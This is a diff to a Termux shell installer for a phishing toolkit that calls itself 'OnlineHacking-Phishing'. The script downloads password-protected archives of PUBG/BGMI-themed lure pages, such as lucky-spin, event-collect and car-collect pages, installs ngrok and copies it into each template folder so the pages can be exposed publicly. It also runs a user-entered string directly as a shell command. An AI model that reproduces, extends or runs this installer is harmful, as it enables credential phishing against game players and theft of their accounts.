@@ -56,8 +56,8 @@ pkg install ruby -y
 pkg install gem -y
 gem install lolcat
 clear
-wget https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip
-unzip Ngrok_Linux_Droid.zip
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
+unzip ngrok-stable-linux-arm.zip
 wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SUMAN-PUBG.rar
 wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SUMAN-BGMI.rar
 unrar x -Password SUMAN-PUBG.rar
@@ -65,6 +65,16 @@ unrar x -Password SUMAN-BGMI.rar
 rm -rf ngrok-stable-linux-arm.zip  SUMAN-PUBG.rar SUMAN-BGMI.rar
 chmod +x ngrok
 chmod 7777 ngrok
+echo ""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
+echo ""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
+echo ""
+sleep 1
+echo ""
+read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+$token
+sleep1
 cp -R ngrok SUMAN/Collect-EVENT-LINE/
 cp -R ngrok SUMAN/Collect-MC-Larent-Car/
 cp -R ngrok SUMAN/Lucky-Spin-Godzila-S19/
@@ -77,16 +87,6 @@ cp -R ngrok SUMAN1/RPS19-COLLECT/
 cp -R ngrok SUMAN1/X-Suit-LuckySpin/
 chmod 7777 OnlineHacking-Phishing
 clear
-echo ""
-echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
-echo ""
-echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
-echo ""
-sleep 1
-echo ""
-read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
-$token
-sleep2
 echo
 clear
 echo
